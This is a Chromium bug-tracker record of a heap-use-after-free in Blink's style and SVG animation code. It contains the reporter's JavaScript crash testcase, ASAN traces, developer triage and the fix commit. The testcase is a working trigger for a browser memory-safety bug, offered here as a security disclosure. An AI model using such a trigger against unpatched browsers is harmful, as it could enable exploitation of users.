# Security: heap-use-after-free in blink::CSSToLengthConversionData::FontSizes::FontSizes

| Field | Value |
|-------|-------|
| **Issue ID** | [40093821](https://issues.chromium.org/issues/40093821) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>CSS |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | cl...@gmail.com |
| **Assignee** | fs...@opera.com |
| **Created** | 2019-01-23 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the latest ASAN build of content\_shell when loaded from an HTTP server. It requires the attached img.svg in the same directory. The testcase might require a few attempts to trigger the issue.

**VERSION**  

Chrome Version: asan-linux-release-624586  

Operating System: Linux 64-bit

**REPRODUCTION CASE**

crash.html:

<script>
function start() {
o0=document.createElement('canvas');
o3=document.createElement('form');
o158=window.document;
setTimeout(fun0, 4);
}
function fun0() {
document.documentElement.appendChild(o0);
o286=o158.implementation.createDocument('http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul','bindings',undefined);
o432=document.createElementNS('http://www.w3.org/1999/xhtml','img');
setTimeout(fun1, 4);
}
function fun1() {
o0.toBlob(fun2);
o683=document.createElementNS('http://www.w3.org/1999/xhtml','input');
o432.src='img.svg';
o158.write('<html><body></body></html>');
}
function fun2() {
new Int32Array(343932928);
o432.srcset='undefined';
o3.submit();
o3.appendChild(o683);
setTimeout("location.href='crash.html'",400\\*Math.random());
}
</script>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

=================================================================  

==4105==ERROR: AddressSanitizer: heap-use-after-free on address 0x608000046e48 at pc 0x5563b0cc7cfc bp 0x7fff2f75db00 sp 0x7fff2f75daf8  

READ of size 8 at 0x608000046e48 thread T0 (content\_shell)  

#0 0x5563b0cc7cfb in get base/memory/scoped\_refptr.h:212:27  

#1 0x5563b0cc7cfb in Get third\_party/blink/renderer/core/style/data\_ref.h:37  

#2 0x5563b0cc7cfb in operator-> third\_party/blink/renderer/core/style/data\_ref.h:40  

#3 0x5563b0cc7cfb in FontInternal gen/third\_party/blink/renderer/core/style/computed\_style\_base.h:6965  

#4 0x5563b0cc7cfb in GetFontDescription third\_party/blink/renderer/core/style/computed\_style.h:906  

#5 0x5563b0cc7cfb in ComputedFontSize third\_party/blink/renderer/core/style/computed\_style.h:917  

#6 0x5563b0cc7cfb in blink::CSSToLengthConversionData::FontSizes::FontSizes(blink::ComputedStyle const\*, blink::ComputedStyle const\*) third\_party/blink/renderer/core/css/css\_to\_length\_conversion\_data.cc:50  

#7 0x5563b124661d in UpdateFont third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:1060:32  

#8 0x5563b124661d in blink::StyleResolver::ApplyMatchedStandardProperties(blink::StyleResolverState&, blink::MatchResult const&, blink::StyleResolver::CacheSuccess const&, blink::StyleResolver::NeedsApplyPass&) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:1840  

#9 0x5563b123affe in blink::StyleResolver::ApplyMatchedPropertiesAndCustomPropertyAnimations(blink::StyleResolverState&, blink::MatchResult const&, blink::Element const\*) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:1650:5  

#10 0x5563b1239055 in blink::StyleResolver::StyleForElement(blink::Element\*, blink::ComputedStyle const\*, blink::ComputedStyle const\*, blink::RuleMatchingBehavior) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:806:5  

#11 0x5563b3e8ea82 in blink::SVGElement::CustomStyleForLayoutObject() third\_party/blink/renderer/core/svg/svg\_element.cc:1031:48  

#12 0x5563b1646cb2 in blink::Element::StyleForLayoutObject(bool) third\_party/blink/renderer/core/dom/element.cc:2173:46  

#13 0x5563b1649c6d in blink::Element::RecalcOwnStyle(blink::StyleRecalcChange, bool) third\_party/blink/renderer/core/dom/element.cc:2379:17  

#14 0x5563b16480bc in blink::Element::RecalcStyle(blink::StyleRecalcChange, bool) third\_party/blink/renderer/core/dom/element.cc:2288:16  

#15 0x5563b145fff6 in blink::ContainerNode::RecalcDescendantStyles(blink::StyleRecalcChange, bool) third\_party/blink/renderer/core/dom/container\_node.cc:1417:18  

#16 0x5563b16487ed in blink::Element::RecalcStyle(blink::StyleRecalcChange, bool) third\_party/blink/renderer/core/dom/element.cc:2324:7  

#17 0x5563b145fff6 in blink::ContainerNode::RecalcDescendantStyles(blink::StyleRecalcChange, bool) third\_party/blink/renderer/core/dom/container\_node.cc:1417:18  

#18 0x5563b16487ed in blink::Element::RecalcStyle(blink::StyleRecalcChange, bool) third\_party/blink/renderer/core/dom/element.cc:2324:7  

#19 0x5563b1373899 in blink::StyleEngine::RecalcStyle(blink::StyleRecalcChange) third\_party/blink/renderer/core/css/style\_engine.cc:1699:38  

#20 0x5563b14bf43e in blink::Document::UpdateStyle() third\_party/blink/renderer/core/dom/document.cc:2321:24  

#21 0x5563b14b03da in blink::Document::UpdateStyleAndLayoutTree() third\_party/blink/renderer/core/dom/document.cc:2237:3  

#22 0x5563b0bcdeb6 in blink::CSSComputedStyleDeclaration::GetPropertyCSSValue(blink::CSSProperty const&) const third\_party/blink/renderer/core/css/css\_computed\_style\_declaration.cc:351:12  

#23 0x5563b0bccf1e in blink::CSSComputedStyleDeclaration::GetPropertyValue(blink::CSSPropertyID) const third\_party/blink/renderer/core/css/css\_computed\_style\_declaration.cc:386:27  

#24 0x5563b3e40187 in ComputeCSSPropertyValue third\_party/blink/renderer/core/svg/svg\_animate\_element.cc:59:53  

#25 0x5563b3e40187 in blink::SVGAnimateElement::ResetAnimatedType() third\_party/blink/renderer/core/svg/svg\_animate\_element.cc:441  

#26 0x5563b3de545f in blink::SMILTimeContainer::UpdateAnimations(double, bool) third\_party/blink/renderer/core/svg/animation/smil\_time\_container.cc:485:25  

#27 0x5563b3de245e in blink::SMILTimeContainer::UpdateAnimationsAndScheduleFrameIfNeeded(double, bool) third\_party/blink/renderer/core/svg/animation/smil\_time\_container.cc:414:33  

#28 0x5563b076a5cb in blink::TimerBase::RunInternal() third\_party/blink/renderer/platform/timer.cc:156:3  

#29 0x5563aa0095fe in Run base/callback.h:99:12  

#30 0x5563aa0095fe in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:99  

#31 0x5563aa10815a in base::sequence\_manager::internal::ThreadControllerImpl::DoWork(base::sequence\_manager::internal::ThreadControllerImpl::WorkType) base/task/sequence\_manager/thread\_controller\_impl.cc:209:23  

#32 0x5563aa0095fe in Run base/callback.h:99:12  

#33 0x5563aa0095fe in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:99  

#34 0x5563aa0066b7 in base::MessageLoopImpl::RunTask(base::PendingTask\*) base/message\_loop/message\_loop\_impl.cc:352:46  

#35 0x5563aa007d33 in DeferOrRunPendingTask base/message\_loop/message\_loop\_impl.cc:363:5  

#36 0x5563aa007d33 in base::MessageLoopImpl::DoWork() base/message\_loop/message\_loop\_impl.cc:451  

#37 0x5563aa00efbf in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:39:31  

#38 0x5563aa080662 in base::RunLoop::Run() base/run\_loop.cc:150:14  

#39 0x5563b7e9c308 in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:233:16  

#40 0x5563a7725a00 in content::RunZygote(content::ContentMainDelegate\*) content/app/content\_main\_runner\_impl.cc:503:14  

#41 0x5563a7729abc in content::ContentMainRunnerImpl::Run(bool) content/app/content\_main\_runner\_impl.cc:871:10  

#42 0x5563af670fc7 in service\_manager::Main(service\_manager::MainParams const&) services/service\_manager/embedder/main.cc:461:29  

#43 0x5563a4ab321c in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:10  

#44 0x5563a1d4f547 in main content/shell/app/shell\_main.cc:39:10  

#45 0x7fe733ae4b96 in \_\_libc\_start\_main (/lib/x86\_64-linux-gnu/libc.so.6+0x21b96)

0x608000046e48 is located 40 bytes inside of 96-byte region [0x608000046e20,0x608000046e80)  

freed by thread T0 (content\_shell) here:  

#0 0x5563a1d1f552 in \_\_interceptor\_free /b/swarming/w/ir/kitchen-workdir/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cc:124:3  

#1 0x5563b3572d3c in ~LayoutSVGRoot third\_party/blink/renderer/core/layout/svg/layout\_svg\_root.cc:68:31  

#2 0x5563b3572d3c in blink::LayoutSVGRoot::~LayoutSVGRoot() third\_party/blink/renderer/core/layout/svg/layout\_svg\_root.cc:68  

#3 0x5563b30f9285 in blink::LayoutObject::DestroyAndCleanupAnonymousWrappers() third\_party/blink/renderer/core/layout/layout\_object.cc  

#4 0x5563b176df8a in blink::Node::DetachLayoutTree(blink::Node::AttachContext const&) third\_party/blink/renderer/core/dom/node.cc:1427:24  

#5 0x5563b1645215 in blink::Element::DetachLayoutTree(blink::Node::AttachContext const&) third\_party/blink/renderer/core/dom/element.cc:2135:18  

#6 0x5563b3e7b7e7 in blink::SVGElement::DetachLayoutTree(blink::Node::AttachContext const&) third\_party/blink/renderer/core/svg/svg\_element.cc:84:12  

#7 0x5563b14565fd in blink::ContainerNode::DetachLayoutTree(blink::Node::AttachContext const&) third\_party/blink/renderer/core/dom/container\_node.cc:1009:12  

#8 0x5563b14c7599 in blink::Document::Shutdown() third\_party/blink/renderer/core/dom/document.cc:2892:18  

#9 0x5563b1f8c70e in blink::LocalFrame::DetachImpl(blink::FrameDetachType) third\_party/blink/renderer/core/frame/local\_frame.cc:395:18  

#10 0x5563b1f32884 in blink::Frame::Detach(blink::FrameDetachType) third\_party/blink/renderer/core/frame/frame.cc:81:3  

#11 0x5563b38038aa in blink::Page::WillBeDestroyed() third\_party/blink/renderer/core/page/page.cc:763:15  

#12 0x5563b3dd090d in blink::SVGImage::~SVGImage() third\_party/blink/renderer/core/svg/graphics/svg\_image.cc:111:19  

#13 0x5563b3dd0a4c in blink::SVGImage::~SVGImage() third\_party/blink/renderer/core/svg/graphics/svg\_image.cc:102:23  

#14 0x5563b36d9a30 in DeleteInternal[blink::Image](javascript:void(0);) third\_party/blink/renderer/platform/wtf/thread\_safe\_ref\_counted.h:64:5  

#15 0x5563b36d9a30 in Destruct third\_party/blink/renderer/platform/wtf/thread\_safe\_ref\_counted.h:44  

#16 0x5563b36d9a30 in Release base/memory/ref\_counted.h:403  

#17 0x5563b36d9a30 in Release base/memory/scoped\_refptr.h:297  

#18 0x5563b36d9a30 in ~scoped\_refptr base/memory/scoped\_refptr.h:209  

#19 0x5563b36d9a30 in ~ImageResourceContent third\_party/blink/renderer/core/loader/resource/image\_resource\_content.h:42  

#20 0x5563b36d9a30 in FinalizeGarbageCollectedObject third\_party/blink/renderer/platform/heap/garbage\_collected.h:214  

#21 0x5563b36d9a30 in Finalize third\_party/blink/renderer/platform/heap/finalizer\_traits.h:30  

#22 0x5563b36d9a30 in blink::FinalizerTrait[blink::ImageResourceContent](javascript:void(0);)::Finalize(void\*) third\_party/blink/renderer/platform/heap/finalizer\_traits.h:56  

#23 0x5563a716f7c6 in Finalize third\_party/blink/renderer/platform/heap/heap\_page.cc:103:5  

#24 0x5563a716f7c6 in blink::NormalPage::Sweep() third\_party/blink/renderer/platform/heap/heap\_page.cc:1344  

#25 0x5563a7167e50 in SweepUnsweptPage third\_party/blink/renderer/platform/heap/heap\_page.cc:283:31  

#26 0x5563a7167e50 in blink::BaseArena::CompleteSweep() third\_party/blink/renderer/platform/heap/heap\_page.cc:339  

#27 0x5563a714e814 in blink::ThreadHeap::CompleteSweep() third\_party/blink/renderer/platform/heap/heap.cc:422:17  

#28 0x5563a717e7fa in blink::ThreadState::CompleteSweep() third\_party/blink/renderer/platform/heap/thread\_state.cc:1042:12  

#29 0x5563a716dd41 in blink::NormalPageArena::OutOfLineAllocate(unsigned long, unsigned long) third\_party/blink/renderer/platform/heap/heap\_page.cc:924:21  

#30 0x5563b129184e in AllocateObject third\_party/blink/renderer/platform/heap/heap\_page.h:1045:10  

#31 0x5563b129184e in blink::MatchedRule\* blink::HeapAllocator::AllocateVectorBacking[blink::MatchedRule](javascript:void(0);)(unsigned long) third\_party/blink/renderer/platform/heap/heap\_allocator.h:78  

#32 0x5563b1296f8b in AllocateBuffer third\_party/blink/renderer/platform/wtf/vector.h:396:17  

#33 0x5563b1296f8b in WTF::Vector<blink::MatchedRule, 32u, blink::HeapAllocator>::ReserveCapacity(unsigned int) third\_party/blink/renderer/platform/wtf/vector.h:1638  

#34 0x5563b1296084 in ExpandCapacity third\_party/blink/renderer/platform/wtf/vector.h:1570:3  

#35 0x5563b1296084 in ExpandCapacity third\_party/blink/renderer/platform/wtf/vector.h:1579  

#36 0x5563b1296084 in void WTF::Vector<blink::MatchedRule, 32u, blink::HeapAllocator>::AppendSlowCase[blink::MatchedRule](javascript:void(0);)(blink::MatchedRule&&) third\_party/blink/renderer/platform/wtf/vector.h:1775  

#37 0x5563b128e3b7 in push\_back[blink::MatchedRule](javascript:void(0);) third\_party/blink/renderer/platform/wtf/vector.h:1732:3  

#38 0x5563b128e3b7 in blink::ElementRuleCollector::DidMatchRule(blink::RuleData const\*, blink::SelectorChecker::MatchResult const&, unsigned int, blink::MatchRequest const&) third\_party/blink/renderer/core/css/element\_rule\_collector.cc:359  

#39 0x5563b128bb55 in void blink::ElementRuleCollector::CollectMatchingRulesForList<blink::HeapVector<blink::Member<blink::RuleData const>, 0u> >(blink::HeapVector<blink::Member<blink::RuleData const>, 0u> const\*, unsigned int, blink::MatchRequest const&, blink::PartNames\*) third\_party/blink/renderer/core/css/element\_rule\_collector.cc:174:5  

#40 0x5563b128abfc in blink::ElementRuleCollector::CollectMatchingRules(blink::MatchRequest const&, unsigned int, bool) third\_party/blink/renderer/core/css/element\_rule\_collector.cc:248:3  

#41 0x5563b1234681 in MatchRuleSet third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:537:13  

#42 0x5563b1234681 in blink::StyleResolver::MatchUARules(blink::ElementRuleCollector&) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:519  

#43 0x5563b1234c53 in blink::StyleResolver::MatchAllRules(blink::StyleResolverState&, blink::ElementRuleCollector&, bool) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:545:3  

#44 0x5563b12380ed in blink::StyleResolver::StyleForElement(blink::Element\*, blink::ComputedStyle const\*, blink::ComputedStyle const\*, blink::RuleMatchingBehavior) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:770:5  

#45 0x5563b3e8ea82 in blink::SVGElement::CustomStyleForLayoutObject() third\_party/blink/renderer/core/svg/svg\_element.cc:1031:48  

#46 0x5563b1646cb2 in blink::Element::StyleForLayoutObject(bool) third\_party/blink/renderer/core/dom/element.cc:2173:46

previously allocated by thread T0 (content\_shell) here:  

#0 0x5563a1d1f8d3 in \_\_interceptor\_malloc /b/swarming/w/ir/kitchen-workdir/src/third\_party/llvm/compiler-rt/lib/asan/asan\_malloc\_linux.cc:146:3  

#1 0x5563b3d3e336 in PartitionAllocGenericFlags base/allocator/partition\_allocator/partition\_alloc.h:354:48  

#2 0x5563b3d3e336 in Alloc base/allocator/partition\_allocator/partition\_alloc.h:375  

#3 0x5563b3d3e336 in FastMalloc third\_party/blink/renderer/platform/wtf/allocator/partitions.h:114  

#4 0x5563b3d3e336 in operator new third\_party/blink/renderer/platform/wtf/ref\_counted.h:44  

#5 0x5563b3d3e336 in blink::ComputedStyle::Create() third\_party/blink/renderer/core/style/computed\_style.cc:104  

#6 0x5563b123600e in blink::StyleResolver::InitialStyleForElement(blink::Document&) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:1023:48  

#7 0x5563b12373f5 in blink::StyleResolver::StyleForElement(blink::Element\*, blink::ComputedStyle const\*, blink::ComputedStyle const\*, blink::RuleMatchingBehavior) third\_party/blink/renderer/core/css/resolver/style\_resolver.cc:734:22  

#8 0x5563b3e8ea82 in blink::SVGElement::CustomStyleForLayoutObject() third\_party/blink/renderer/core/svg/svg\_element.cc:1031:48  

#9 0x5563b1646cb2 in blink::Element::StyleForLayoutObject(bool) third\_party/blink/renderer/core/dom/element.cc:2173:46  

#10 0x5563b1649c6d in blink::Element::RecalcOwnStyle(blink::StyleRecalcChange, bool) third\_party/blink/renderer/core/dom/element.cc:2379:17  

#11 0x5563b16480bc in blink::Element::RecalcStyle(blink::StyleRecalcChange, bool) third\_party/blink/renderer/core/dom/element.cc:2288:16  

#12 0x5563b1373899 in blink::StyleEngine::RecalcStyle(blink::StyleRecalcChange) third\_party/blink/renderer/core/css/style\_engine.cc:1699:38  

#13 0x5563b14bf43e in blink::Document::UpdateStyle() third\_party/blink/renderer/core/dom/document.cc:2321:24  

#14 0x5563b14b03da in blink::Document::UpdateStyleAndLayoutTree() third\_party/blink/renderer/core/dom/document.cc:2237:3  

#15 0x5563b14f8dc1 in blink::Document::FinishedParsing() third\_party/blink/renderer/core/dom/document.cc:6176:7  

#16 0x5563b420031f in blink::XMLDocumentParser::end() third\_party/blink/renderer/core/xml/parser/xml\_document\_parser.cc:413:18  

#17 0x5563b1f9c58a in blink::LocalFrame::ForceSynchronousDocumentInstall(WTF::AtomicString const&, scoped\_refptr[blink::SharedBuffer](javascript:void(0);)) third\_party/blink/renderer/core/frame/local\_frame.cc:1449:28  

#18 0x5563b3ddbceb in blink::SVGImage::DataChanged(bool) third\_party/blink/renderer/core/svg/graphics/svg\_image.cc:803:10  

#19 0x5563b36e4d7b in blink::ImageResourceContent::UpdateImage(scoped\_refptr[blink::SharedBuffer](javascript:void(0);), blink::ResourceStatus, blink::ImageResourceContent::UpdateImageOption, bool, bool) third\_party/blink/renderer/core/loader/resource/image\_resource\_content.cc:426:35  

#20 0x5563b36d6203 in UpdateImage third\_party/blink/renderer/core/loader/resource/image\_resource.cc:737:31  

#21 0x5563b36d6203 in blink::ImageResource::Finish(base::TimeTicks, base::SingleThreadTaskRunner\*) third\_party/blink/renderer/core/loader/resource/image\_resource.cc:440  

#22 0x5563a7246960 in blink::ResourceFetcher::HandleLoaderFinish(blink::Resource\*, base::TimeTicks, blink::ResourceFetcher::LoaderFinishType, unsigned int, bool, std::\_\_1::vector<network::cors::PreflightTimingInfo, std::\_\_1::allocator[network::cors::PreflightTimingInfo](javascript:void(0);) > const&) third\_party/blink/renderer/platform/loader/fetch/resource\_fetcher.cc:1761:15  

#23 0x5563a7290510 in blink::ResourceLoader::DidFinishLoading(base::TimeTicks, long, long, long, bool, std::\_\_1::vector<network::cors::PreflightTimingInfo, std::\_\_1::allocator[network::cors::PreflightTimingInfo](javascript:void(0);) > const&) third\_party/blink/renderer/platform/loader/fetch/resource\_loader.cc:1020:13  

#24 0x5563b6dc77df in content::WebURLLoaderImpl::Context::MaybeCompleteRequest() content/renderer/loader/web\_url\_loader\_impl.cc:1152:16  

#25 0x5563b6dd22d5 in content::ResourceDispatcher::OnRequestComplete(int, network::URLLoaderCompletionStatus const&) content/renderer/loader/resource\_dispatcher.cc:323:9  

#26 0x5563b6de386e in content::URLLoaderClientImpl::OnComplete(network::URLLoaderCompletionStatus const&) content/renderer/loader/url\_loader\_client\_impl.cc:377:19  

#27 0x5563a2cbb4ed in network::mojom::URLLoaderClientStubDispatch::Accept(network::mojom::URLLoaderClient\*, mojo::Message\*) gen/services/network/public/mojom/url\_loader.mojom.cc:1386:13  

#28 0x5563aa2b6b20 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message\*) mojo/public/cpp/bindings/lib/interface\_endpoint\_client.cc:423:32  

#29 0x5563aa2cb627 in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper\*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner\*) mojo/public/cpp/bindings/lib/multiplex\_router.cc:873:42  

#30 0x5563aa2c95b1 in mojo::internal::MultiplexRouter::Accept(mojo::Message\*) mojo/public/cpp/bindings/lib/multiplex\_router.cc:594:38  

#31 0x5563aa2ab31c in mojo::Connector::DispatchMessage(mojo::Message) mojo/public/cpp/bindings/lib/connector.cc:509:49  

#32 0x5563aa2ad462 in mojo::Connector::ReadAllAvailableMessages() mojo/public/cpp/bindings/lib/connector.cc:584:12  

#33 0x5563aa291b22 in Run base/callback.h:129:12  

#34 0x5563aa291b22 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&) mojo/public/cpp/system/simple\_watcher.cc:288  

#35 0x5563aa0095fe in Run base/callback.h:99:12  

#36 0x5563aa0095fe in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) base/debug/task\_annotator.cc:99

SUMMARY: AddressSanitizer: heap-use-after-free base/memory/scoped\_refptr.h:212:27 in get  

Shadow bytes around the buggy address:  

0x0c1080000d70: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c1080000d80: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c1080000d90: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c1080000da0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c1080000db0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

=>0x0c1080000dc0: fa fa fa fa fd fd fd fd fd[fd]fd fd fd fd fd fd  

0x0c1080000dd0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa  

0x0c1080000de0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c1080000df0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c1080000e00: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

0x0c1080000e10: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==4105==ABORTING

## Attachments

- [img.svg](attachments/img.svg) (image/svg+xml, 2.8 KB)

## Timeline

### cl...@chromium.org (2019-01-23)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5681293736148992.

### cl...@chromium.org (2019-01-23)

Testcase 5681293736148992 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5681293736148992.

### cl...@chromium.org (2019-01-23)

Testcase 5681293736148992 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5681293736148992.

### li...@chromium.org (2019-01-23)

Re-routing to andruud@ for triage--could you please take a look? I'm having trouble reproducing this bug. Thanks!

[Monorail components: Blink>CSS]

### sh...@chromium.org (2019-01-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-24)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-01-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-24)

[Empty comment from Monorail migration]

### an...@chromium.org (2019-01-28)

[Empty comment from Monorail migration]

### an...@chromium.org (2019-01-28)

I can't reproduce this either ...

From the stacks, it looks like the SVG is destroyed, but a scheduled animation update is allowed to execute.

It's not clear to me who/what is responsible for unscheduling the animation when the SVG is destroyed, from just reading the code.

fs@, are you familiar with SVGSMILElement, SMILTimeContainer and friends?

### fs...@opera.com (2019-01-28)

Seems like a case of mat-yank. The "normal" way animations are stopped is by:

ImageResource::AllClientsAndObserversRemoved ->
[possibly async] ->
ImageResourceContent::DoResetAnimation ->
Image::ResetAnimation

but the first step there has some GC-based non-determinism (because of https://crbug.com/chromium/613709), which may be exposing this opportunity to sweep.

I can take a look.

### fs...@opera.com (2019-01-28)

It looks like it would be possible to remove/undo the workaround added by https://crbug.com/chromium/613709 now, since the fix for https://crbug.com/chromium/627418 eliminated the timeline reset (which was the cause of the former).

### sh...@chromium.org (2019-01-30)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-01-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/9580bba0e0de87cf9ddbfbd84904fa1411813e84

commit 9580bba0e0de87cf9ddbfbd84904fa1411813e84
Author: Fredrik Söderquist <fs@opera.com>
Date: Wed Jan 30 14:52:25 2019

Call ResetAnimation synchronously in ImageResource::AllClientsAndObserversRemoved

Running ResetAnimation asynchronously gives the "wake-up timer" used by
the SMIL animation engine an opportunity to race with the actual
sweeping of the surrounding objects (ImageResourceContent, SVGImage with
contained Page). Said sweeping could thus take place when the handler
for the "wake-up timer" was running, leading to UAFs. Running
ResetAnimation synchronously stops the "wake-up timer" and prevents the
race.

This essentially reverts the workaround added by
r400934 (crbug.com/613709). After the change made by
r412798 (crbug.com/627418), the issue worked around - that the SMIL
animation engine could be re-entered via the ResetAnimation call during
GC - have been eliminated. (Now, after said CL, what
SVGImage::ResetAnimation does is to pause the animation, stopping all
timers, and set a flag that the animation state needs to be reset. The
resetting then happens later as needed.)

Bug: 924450
Change-Id: Ideef98f05c81d779950aac56506cbbe152762afa
Reviewed-on: https://chromium-review.googlesource.com/c/1445935
Reviewed-by: Kentaro Hara <haraken@chromium.org>
Commit-Queue: Fredrik Söderquist <fs@opera.com>
Cr-Commit-Position: refs/heads/master@{#627431}
[modify] https://crrev.com/9580bba0e0de87cf9ddbfbd84904fa1411813e84/third_party/blink/renderer/core/loader/resource/image_resource.cc


### fs...@opera.com (2019-01-31)

[Empty comment from Monorail migration]

### fs...@opera.com (2019-01-31)

Will give the fix some time to bake, then request merge.

### sh...@chromium.org (2019-01-31)

[Empty comment from Monorail migration]

### na...@google.com (2019-02-04)

[Empty comment from Monorail migration]

### na...@google.com (2019-02-07)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### na...@google.com (2019-02-07)

Congrats! The Panel has decided to reward $3000 for this report :) 

### na...@google.com (2019-02-07)

[Empty comment from Monorail migration]

### fs...@opera.com (2019-02-08)

[Empty comment from Monorail migration]

### sr...@google.com (2019-02-08)

awhalley@ can you please review this security request for M73

### sh...@chromium.org (2019-02-08)

This bug requires manual review: M73 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), cindyb@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ci...@chromium.org (2019-02-08)

Merge approved, M73

### cr...@appspot.gserviceaccount.com (2019-02-09)

The following revision refers to this bug: 
https://chromium.googlesource.com/chromium/src.git/+/3c99550a426a4171cd98c117e36e2b7a42b19ab0

Commit: 3c99550a426a4171cd98c117e36e2b7a42b19ab0
Author: fs@opera.com
Commiter: fs@opera.com
Date: 2019-02-09 18:48:59 +0000 UTC

Call ResetAnimation synchronously in ImageResource::AllClientsAndObserversRemoved

Running ResetAnimation asynchronously gives the "wake-up timer" used by
the SMIL animation engine an opportunity to race with the actual
sweeping of the surrounding objects (ImageResourceContent, SVGImage with
contained Page). Said sweeping could thus take place when the handler
for the "wake-up timer" was running, leading to UAFs. Running
ResetAnimation synchronously stops the "wake-up timer" and prevents the
race.

This essentially reverts the workaround added by
r400934 (crbug.com/613709). After the change made by
r412798 (crbug.com/627418), the issue worked around - that the SMIL
animation engine could be re-entered via the ResetAnimation call during
GC - have been eliminated. (Now, after said CL, what
SVGImage::ResetAnimation does is to pause the animation, stopping all
timers, and set a flag that the animation state needs to be reset. The
resetting then happens later as needed.)

Bug: 924450
Change-Id: Ideef98f05c81d779950aac56506cbbe152762afa
Reviewed-on: https://chromium-review.googlesource.com/c/1445935
Reviewed-by: Kentaro Hara <haraken@chromium.org>
Commit-Queue: Fredrik Söderquist <fs@opera.com>
Cr-Original-Commit-Position: refs/heads/master@{#627431}(cherry picked from commit 9580bba0e0de87cf9ddbfbd84904fa1411813e84)
Reviewed-on: https://chromium-review.googlesource.com/c/1459641
Reviewed-by: Fredrik Söderquist <fs@opera.com>
Cr-Commit-Position: refs/branch-heads/3683@{#327}
Cr-Branched-From: e51029943e0a38dd794b73caaf6373d5496ae783-refs/heads/master@{#625896}

### aw...@google.com (2019-02-15)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-05-09)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/924450?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40093821)*
